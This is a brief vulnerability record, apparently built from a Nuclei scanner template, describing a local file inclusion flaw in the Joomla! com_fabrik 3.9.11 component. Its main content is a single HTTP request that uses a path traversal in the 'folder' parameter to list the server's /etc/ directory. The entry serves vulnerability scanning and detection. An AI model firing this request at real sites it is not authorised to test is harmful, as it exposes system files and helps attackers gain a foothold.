# Vulnerability: Joomla! com_fabrik 3.9.11 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`joomla-com-fabrik-lfi.yaml`)

## Description
Joomla! com_fabrik 3.9.11 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../etc/
```

